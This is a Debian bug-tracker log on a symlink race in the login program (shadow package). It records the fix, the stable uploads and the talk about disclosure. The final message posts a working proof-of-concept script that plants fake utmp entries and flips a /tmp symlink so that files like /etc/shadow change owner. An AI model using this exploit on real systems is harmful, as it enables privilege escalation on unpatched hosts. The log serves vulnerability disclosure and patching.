**Bug [505071](bugreport.cgi?bug=505071) cloned as bug [505271](bugreport.cgi?bug=505271).**
Request was from `Nicolas François <nicolas.francois@centraliens.net>`
to `control@bugs.debian.org`.
(Tue, 11 Nov 2008 11:04:39 GMT) ([full text](bugreport.cgi?bug=505271;msg=62), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=62), [link](#61)).

---

**Changed Bug title to `symlink attack in login leading to arbitrary file ownership' from `login tty mis-determination (see bug#332198)'.**
Request was from `Nicolas François <nicolas.francois@centraliens.net>`
to `control@bugs.debian.org`.
(Tue, 11 Nov 2008 11:04:41 GMT) ([full text](bugreport.cgi?bug=505271;msg=64), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=64), [link](#63)).

---

**Tags added: security**
Request was from `Nicolas François <nicolas.francois@centraliens.net>`
to `control@bugs.debian.org`.
(Tue, 11 Nov 2008 11:04:42 GMT) ([full text](bugreport.cgi?bug=505271;msg=66), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=66), [link](#65)).

---

**Severity set to `serious' from `normal'**
Request was from `Nicolas François <nicolas.francois@centraliens.net>`
to `control@bugs.debian.org`.
(Tue, 11 Nov 2008 11:04:43 GMT) ([full text](bugreport.cgi?bug=505271;msg=68), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=68), [link](#67)).

---

**Tags added: patch**
Request was from `Nicolas François <nicolas.francois@centraliens.net>`
to `control@bugs.debian.org`.
(Tue, 11 Nov 2008 11:04:46 GMT) ([full text](bugreport.cgi?bug=505271;msg=70), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=70), [link](#69)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Tue, 11 Nov 2008 12:15:09 GMT) ([full text](bugreport.cgi?bug=505271;msg=72), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=72), [link](#71)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Tue, 11 Nov 2008 12:15:09 GMT) ([full text](bugreport.cgi?bug=505271;msg=74), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=74), [link](#73)).

---

[Message #75](#75) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=75), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=75), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: nicolas.francois@centraliens.net
Cc: 505071@bugs.debian.org, 505271@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: login tty mis-determination (see bug#332198)
Date: Tue, 11 Nov 2008 23:13:21 +1100
```
Dear Nekral,

> Proposed fix: Changing chown (tty, ...) to fchown (0, ...) in chowntty()

Surely you meant to change chmod to fchmod also. (I know this is
nit-picking, but best to be sure...)

Thanks, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Fri, 14 Nov 2008 09:45:20 GMT) ([full text](bugreport.cgi?bug=505271;msg=77), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=77), [link](#76)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Fri, 14 Nov 2008 09:45:23 GMT) ([full text](bugreport.cgi?bug=505271;msg=79), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=79), [link](#78)).

---

[Message #80](#80) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=80), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=80), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505271@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: Bug#505071: login tty mis-determination (see bug#332198)
Date: Fri, 14 Nov 2008 20:33:43 +1100
```
Dear Nekral,

Long ago you wrote:

>> ... Should I attempt to write an exploit/demo?
> That would be nice to check if it would be possible to chown
> /etc/shadow by cheating utmp.

Done, I now have a working PoC/demo/exploit ... am not yet releasing
it publicly.

Cheers,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Sat, 22 Nov 2008 10:48:06 GMT) ([full text](bugreport.cgi?bug=505271;msg=82), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=82), [link](#81)).

---

**Acknowledgement sent**
to `Moritz Muehlenhoff <jmm@inutil.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sat, 22 Nov 2008 10:48:06 GMT) ([full text](bugreport.cgi?bug=505271;msg=84), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=84), [link](#83)).

---

[Message #85](#85) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=85), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=85), reply):

![](/cgi-bin/libravatar.cgi?email=jmm%40inutil.org)
From: Moritz Muehlenhoff <jmm@inutil.org>
To: Paul Szabo <psz@maths.usyd.edu.au>
Cc: 505271@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: Bug#505071: login tty mis-determination (see bug#332198)
Date: Sat, 22 Nov 2008 11:41:31 +0100
```
On Fri, Nov 14, 2008 at 08:33:43PM +1100, Paul Szabo wrote:
> Dear Nekral,
>
> Long ago you wrote:
>
> >> ... Should I attempt to write an exploit/demo?
> > That would be nice to check if it would be possible to chown
> > /etc/shadow by cheating utmp.
>
> Done, I now have a working PoC/demo/exploit ... am not yet releasing
> it publicly.

What's the status? Could you verify that Nicolas' patch fixes the
problem?

Cheers,
        Moritz

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Sat, 22 Nov 2008 11:06:02 GMT) ([full text](bugreport.cgi?bug=505271;msg=87), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=87), [link](#86)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sat, 22 Nov 2008 11:06:02 GMT) ([full text](bugreport.cgi?bug=505271;msg=89), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=89), [link](#88)).

---

[Message #90](#90) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=90), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=90), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: jmm@inutil.org
Cc: 505271@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: Bug#505071: login tty mis-determination (see bug#332198)
Date: Sat, 22 Nov 2008 22:03:39 +1100
```
Dear Moritz,

Yes, Nicolas's patch does fix the problem. But please note:
(1) It is my patch, not Nicolas's, was first proposed in
    <http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=505071#15>
(2) There is no such patch, nobody has made a "diff" file,
    much less a compiled/built package to try.

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Reply sent**
to `Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net>`:

You have taken responsibility.
(Sat, 22 Nov 2008 18:24:11 GMT) ([full text](bugreport.cgi?bug=505271;msg=92), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=92), [link](#91)).

---

**Notification sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Bug acknowledged by developer.
(Sat, 22 Nov 2008 18:24:11 GMT) ([full text](bugreport.cgi?bug=505271;msg=94), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=94), [link](#93)).

---

[Message #95](#95) received at 505271-close@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=95), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=95), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net>
To: 505271-close@bugs.debian.org
Subject: Bug#505271: fixed in shadow 1:4.1.1-6
Date: Sat, 22 Nov 2008 18:02:03 +0000
```
Source: shadow
Source-Version: 1:4.1.1-6

We believe that the bug you reported is fixed in the latest version of
shadow, which is due to be installed in the Debian FTP archive:

login_4.1.1-6_i386.deb
  to pool/main/s/shadow/login_4.1.1-6_i386.deb
passwd_4.1.1-6_i386.deb
  to pool/main/s/shadow/passwd_4.1.1-6_i386.deb
shadow_4.1.1-6.diff.gz
  to pool/main/s/shadow/shadow_4.1.1-6.diff.gz
shadow_4.1.1-6.dsc
  to pool/main/s/shadow/shadow_4.1.1-6.dsc

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 505271@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net> (supplier of updated shadow package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Format: 1.8
Date: Fri, 14 Nov 2008 21:52:42 +0100
Source: shadow
Binary: passwd login
Architecture: source i386
Version: 1:4.1.1-6
Distribution: unstable
Urgency: medium
Maintainer: Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>
Changed-By: Nicolas FRANCOIS (Nekral) <nicolas.francois@centraliens.net>
Description:
 login      - system login tools
 passwd     - change and administer password and group data
Closes: [501353](bugreport.cgi?bug=501353) [501830](bugreport.cgi?bug=501830) [505271](bugreport.cgi?bug=505271)
Changes:
 shadow (1:4.1.1-6) unstable; urgency=medium
 .
   * The "Rollot" release.
   * debian/patches/303_login_symlink_attack: Fix a race condition that could
     lead to gaining ownership or changing mode of arbitrary files.
     Closes: #[505271](bugreport.cgi?bug=505271)
   * debian/patches/304_su.1_synopsis: Fix the su synopsis. username is
     referenced in the manpage, not LOGIN. Closes: #[501830](bugreport.cgi?bug=501830)
   * debian/patches/305_login.1_japanese: Fix the path of the utmp and wtmp
     files. Closes: #[501353](bugreport.cgi?bug=501353)
Checksums-Sha1:
 46f1e4d4d5283ddfb51d21295cd6d2bcdca817b8 1542 shadow_4.1.1-6.dsc
 8109d3127e691320ea0aac8d10bb8049e5bc2c26 91634 shadow_4.1.1-6.diff.gz
 890ce81171530f32965468c5f1cbb79caca08bd2 872410 passwd_4.1.1-6_i386.deb
 a2b45f1143f7d633108fe433f619c274cbddc278 854400 login_4.1.1-6_i386.deb
Checksums-Sha256:
 7d3ad5d9a3e64c02786ec7df4482d7ffea30fa2cb9e19b9440979d2c825018af 1542 shadow_4.1.1-6.dsc
 8a77b2133fc99b1a9abb6a8d9b536dfc2b17755e136e107a52da9d35ddcc1b43 91634 shadow_4.1.1-6.diff.gz
 e8dc15387131c94d34f99ec0a0aaed871a7ef35d297e2606d519d375332d5123 872410 passwd_4.1.1-6_i386.deb
 83d14bd3f071865e69d5a15deef310743fd7d8ae038e504c52833a7226dc7fdb 854400 login_4.1.1-6_i386.deb
Files:
 86093dda25aa7f6eb4f7bc344d3efd3b 1542 admin required shadow_4.1.1-6.dsc
 c973ab4886b7286556fdb0a482970f3f 91634 admin required shadow_4.1.1-6.diff.gz
 dfefabce28e0634d5cb2f6a9e50f1932 872410 admin required passwd_4.1.1-6_i386.deb
 6485bc7dbdf8bc6b5dbce1c0fcc96c8e 854400 admin required login_4.1.1-6_i386.deb

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (GNU/Linux)

iEYEARECAAYFAkkoROkACgkQWgo5mup89a0lXwCfXfCwKBULRrrXfR6LafqG14Lw
0JcAnidFkWTmd8YgzUbpdXTqinbVDDKu
=t/G0
-----END PGP SIGNATURE-----

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Sat, 22 Nov 2008 20:06:03 GMT) ([full text](bugreport.cgi?bug=505271;msg=97), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=97), [link](#96)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sat, 22 Nov 2008 20:06:03 GMT) ([full text](bugreport.cgi?bug=505271;msg=99), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=99), [link](#98)).

---

[Message #100](#100) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=100), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=100), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505271@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: Bug#505271 closed ... fixed in shadow 1:4.1.1-6
Date: Sun, 23 Nov 2008 07:02:28 +1100
```
Please fix for etch also. Please issue DSA.
Please alert other Linux distros, they are also affected.

Since you claim this issue is fixed, surely (?!) there is no harm
in making the exploit public. Should (may) I do that now?

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Sun, 23 Nov 2008 05:57:07 GMT) ([full text](bugreport.cgi?bug=505271;msg=102), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=102), [link](#101)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 23 Nov 2008 05:57:07 GMT) ([full text](bugreport.cgi?bug=505271;msg=104), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=104), [link](#103)).

---

[Message #105](#105) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=105), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=105), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org, 505271@bugs.debian.org,
nicolas.francois@centraliens.net
Subject: Bug#505071 and Bug#505271 comments
Date: Sun, 23 Nov 2008 16:56:17 +1100
```
Random comments about bugs 505071 and 505271.

Group utmp was introduced so terminal emulators could be setgid instead
of needing setuid root, to prevent bugs in them to escalate to root
access. Terminal emulators are generally not written with security in
mind, being the "more features the better" type of programs. This bug
negates the benefit of the group utmp separation. Any data controllable
by group utmp should be treated as insecure or possibly hostile.

Seems that login attempts to pick the "right" line of the utmp file.
Funny idea, seeing how pututline will whack the entry "anywhere"
(depending on ut_id which are rather arbitrary and irrelevant).

If login wanted to sanitize left-over utmp entries, then should set what
ttyname thinks is the correct ut_line (and what it thinks is a sensible
ut_id), not perpetuate "wrong" settings.

Privileged programs should not attempt to clean up utmp, root can do
that at his leisure e.g. with "echo -n '' > /var/run/utmp".

Cheers,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Sun, 23 Nov 2008 20:51:07 GMT) ([full text](bugreport.cgi?bug=505271;msg=107), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=107), [link](#106)).

---

**Acknowledgement sent**
to `Moritz Muehlenhoff <jmm@inutil.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 23 Nov 2008 20:51:07 GMT) ([full text](bugreport.cgi?bug=505271;msg=109), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=109), [link](#108)).

---

[Message #110](#110) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=110), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=110), reply):

![](/cgi-bin/libravatar.cgi?email=jmm%40inutil.org)
From: Moritz Muehlenhoff <jmm@inutil.org>
To: Paul Szabo <psz@maths.usyd.edu.au>
Cc: jmm@inutil.org, 505271@bugs.debian.org,
nicolas.francois@centraliens.net
Subject: Re: Bug#505071: login tty mis-determination (see bug#332198)
Date: Sun, 23 Nov 2008 21:46:59 +0100
```
On Sat, Nov 22, 2008 at 10:03:39PM +1100, Paul Szabo wrote:
> Dear Moritz,
>
> Yes, Nicolas's patch does fix the problem. But please note:
> (1) It is my patch, not Nicolas's, was first proposed in
>     <http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=505071#15>
> (2) There is no such patch, nobody has made a "diff" file,
>     much less a compiled/built package to try.

Nicolas, can you prepare an upload for Lenny?

Cheers,
        Moritz

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Sun, 23 Nov 2008 21:06:02 GMT) ([full text](bugreport.cgi?bug=505271;msg=112), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=112), [link](#111)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 23 Nov 2008 21:06:02 GMT) ([full text](bugreport.cgi?bug=505271;msg=114), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=114), [link](#113)).

---

[Message #115](#115) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=115), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=115), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: jmm@inutil.org
Cc: 505271@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: Bug#505071: login tty mis-determination (see bug#332198)
Date: Mon, 24 Nov 2008 08:01:42 +1100
```
Dear Moritz,

Seems your message relates to "old" things, Nicolas has fixed this for
lenny already.

Please also:
 - fix for etch,
 - alert other Linux distros,
 - issue DSA.

Thanks,

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Sun, 23 Nov 2008 21:27:01 GMT) ([full text](bugreport.cgi?bug=505271;msg=117), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=117), [link](#116)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 23 Nov 2008 21:27:02 GMT) ([full text](bugreport.cgi?bug=505271;msg=119), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=119), [link](#118)).

---

[Message #120](#120) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=120), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=120), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: psz@maths.usyd.edu.au
Cc: jmm@inutil.org, 505271@bugs.debian.org
Subject: Re: Bug#505071: login tty mis-determination (see bug#332198)
Date: Sun, 23 Nov 2008 22:24:26 +0100
```
[[Message part 1](bugreport.cgi?att=0;bug=505271;msg=120) (text/plain, inline)]
```
```
Hello,

On Mon, Nov 24, 2008 at 08:01:42AM +1100, psz@maths.usyd.edu.au wrote:
>
> Seems your message relates to "old" things, Nicolas has fixed this for
> lenny already.

I've made an upload to fix #505271, but not this bug (#505071).
The answer on debian-release was not enough for me to also fix #505071.

> Please also:
>  - fix for etch,

I made an upload for Etch (-7etch1, also to fix #505271)
Moritz, if you can't see it, maybe I did it wrong.

>  - alert other Linux distros,

A new upstream version was released this weekend.

It also contains a fix for this bug (#505071).
I attach this patch in case it is considered OK and needed for Lenny.

>  - issue DSA.

This will be done by the Security Team when the Etch package will be ready
on all archs.

Best Regards,
--
Nekral

```
```
[[shadow_505071.diff](bugreport.cgi?att=1;bug=505271;filename=shadow_505071.diff;msg=120) (text/x-diff, attachment)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Sun, 23 Nov 2008 21:33:08 GMT) ([full text](bugreport.cgi?bug=505271;msg=122), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=122), [link](#121)).

---

**Acknowledgement sent**
to `Moritz Muehlenhoff <jmm@inutil.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 23 Nov 2008 21:33:11 GMT) ([full text](bugreport.cgi?bug=505271;msg=124), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=124), [link](#123)).

---

[Message #125](#125) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=125), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=125), reply):

![](/cgi-bin/libravatar.cgi?email=jmm%40inutil.org)
From: Moritz Muehlenhoff <jmm@inutil.org>
To: Nicolas François <nicolas.francois@centraliens.net>
Cc: psz@maths.usyd.edu.au, jmm@inutil.org, 505271@bugs.debian.org
Subject: Re: Bug#505071: login tty mis-determination (see bug#332198)
Date: Sun, 23 Nov 2008 22:29:55 +0100
```
On Sun, Nov 23, 2008 at 10:24:26PM +0100, Nicolas François wrote:
> Hello,
>
> On Mon, Nov 24, 2008 at 08:01:42AM +1100, psz@maths.usyd.edu.au wrote:
> >
> > Seems your message relates to "old" things, Nicolas has fixed this for
> > lenny already.
>
> I've made an upload to fix #505271, but not this bug (#505071).
> The answer on debian-release was not enough for me to also fix #505071.
>
> > Please also:
> >  - fix for etch,
>
> I made an upload for Etch (-7etch1, also to fix #505271)
> Moritz, if you can't see it, maybe I did it wrong.

I don't see any trace of it on klecker? Can you please send the debdiff
to team@security.debian.org?

Cheers,
        Moritz

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Mon, 24 Nov 2008 00:18:03 GMT) ([full text](bugreport.cgi?bug=505271;msg=127), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=127), [link](#126)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 24 Nov 2008 00:18:03 GMT) ([full text](bugreport.cgi?bug=505271;msg=129), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=129), [link](#128)).

---

[Message #130](#130) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=130), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=130), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: team@security.debian.org
Cc: 505271@bugs.debian.org
Subject: Re: Bug#505071: login tty mis-determination (see bug#332198)
Date: Mon, 24 Nov 2008 01:15:14 +0100
```
[[Message part 1](bugreport.cgi?att=0;bug=505271;msg=130) (text/plain, inline)]
```
```
On Sun, Nov 23, 2008 at 10:29:55PM +0100, jmm@inutil.org wrote:
> On Sun, Nov 23, 2008 at 10:24:26PM +0100, Nicolas François wrote:
> >
> > I made an upload for Etch (-7etch1, also to fix #505271)
> > Moritz, if you can't see it, maybe I did it wrong.
>
> I don't see any trace of it on klecker? Can you please send the debdiff
> to team@security.debian.org?

Here it is.

dupload --to anonymous-security shadow_4.0.18.1-7etch1_i386.changes
is still in my history, and I don't think I interrupted it.

I did not prepare anything for oldstable, but the same patch should still
apply if needed.

Best Regards,
--
Nekral

```
```
[[4.0.18.1-7etch1.debdiff](bugreport.cgi?att=1;bug=505271;filename=4.0.18.1-7etch1.debdiff;msg=130) (text/plain, attachment)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Thu, 27 Nov 2008 09:18:05 GMT) ([full text](bugreport.cgi?bug=505271;msg=132), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=132), [link](#131)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Thu, 27 Nov 2008 09:18:05 GMT) ([full text](bugreport.cgi?bug=505271;msg=134), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=134), [link](#133)).

---

[Message #135](#135) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=135), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=135), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505271@bugs.debian.org, jmm@inutil.org, nicolas.francois@centraliens.net,
team@security.debian.org
Subject: Re: Bug#505271 closed ... fixed in shadow 1:4.1.1-6
Date: Thu, 27 Nov 2008 20:13:49 +1100
```
Dear Nicolas and Moritz,

How long do you expect it will take to "in fact" fix this bug (which is
closed, pretend-fixed, still set to just "serious" severity)? Would it
cause problems if I posted the exploit on Monday 1 Dec?

Thanks, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505271`; Package `login`.
(Sun, 30 Nov 2008 19:33:04 GMT) ([full text](bugreport.cgi?bug=505271;msg=137), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=137), [link](#136)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 30 Nov 2008 19:33:04 GMT) ([full text](bugreport.cgi?bug=505271;msg=139), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=139), [link](#138)).

---

[Message #140](#140) received at 505271@bugs.debian.org ([full text](bugreport.cgi?bug=505271;msg=140), [mbox](bugreport.cgi?bug=505271;mbox=yes;msg=140), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505271@bugs.debian.org, jmm@inutil.org, nicolas.francois@centraliens.net,
team@security.debian.org
Subject: Bug#505271 exploit
Date: Mon, 1 Dec 2008 06:29:25 +1100
```
I asked a few days ago:
> Would it cause problems if I posted the exploit ...?
and did not receive a reply, so I assume it is acceptable
to post a trivial exploit for a "done" bug.

Cheers, Paul

---

#!/bin/bash -

echo '
	#include <string.h>
	#include <stdlib.h>
	#include <unistd.h>
	#include <utmp.h>
	#include <sys/types.h>
	#include <stdio.h>

	int main(int argc, char *argv[])
	{
	  struct utmp entry;
	  int i;

	  entry.ut_type=LOGIN_PROCESS;
	  strcpy(entry.ut_line,"/tmp/x");
	  entry.ut_time=0;
	  strcpy(entry.ut_user,"badguy");
	  strcpy(entry.ut_host,"badhost");
	  entry.ut_addr=0;
	  for(i=1;i<9;i++) {
	    entry.ut_pid=(pid_t)( i + (int)getpid() );
	    sprintf(entry.ut_id,"bad%d",i);
	    pututline(&entry);
	  }
	}
' > /tmp/fillutmp.c

cc -o /tmp/fillutmp /tmp/fillutmp.c

echo 'Ask someone with group utmp privileges to do:'
echo '  chgrp utmp /tmp/fillutmp; chmod 2755 /tmp/fillutmp'
echo -n 'Press [RETURN] to continue... '
read ANS

echo '
	#include <unistd.h>

	int main(int argc, char *argv[])
	{
	  while(1)
	  {
	    unlink("/tmp/x");
	    symlink(argv[1],"/tmp/x");
	    unlink("/tmp/x");
	    symlink(argv[2],"/tmp/x");
	  }
	}
' > /tmp/jigglelnk.c

cc -o /tmp/jigglelnk /tmp/jigglelnk.c

HOST=`hostname` # or simply localhost?
echo "Which tty do you think a 'telnet $HOST' will use next?"
echo "(Do that telnet and see...)"
